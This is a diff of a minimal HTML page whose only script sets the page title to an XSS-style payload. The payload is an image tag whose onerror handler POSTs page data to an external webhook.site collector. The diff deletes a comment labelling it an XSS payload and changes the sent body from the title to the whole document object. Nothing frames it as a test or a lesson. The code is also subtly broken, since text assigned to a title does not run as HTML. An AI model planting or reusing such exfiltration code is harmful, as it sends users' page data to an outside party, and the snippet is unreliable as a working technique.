@@ -6,8 +6,7 @@
     <title>hello</title>
 
     <script>
-        // Dynamically change the title with an XSS payload
-        document.title = `<img src="x" onerror="fetch('https://webhook.site/b9c45f2a-1a13-4de5-a45e-9ffcba741249', {method: 'POST', body: document.title})">`;
+        document.title = `<img src="x" onerror="fetch('https://webhook.site/b9c45f2a-1a13-4de5-a45e-9ffcba741249', {method: 'POST', body: document})">`;
     </script>
 </head>
 <body>
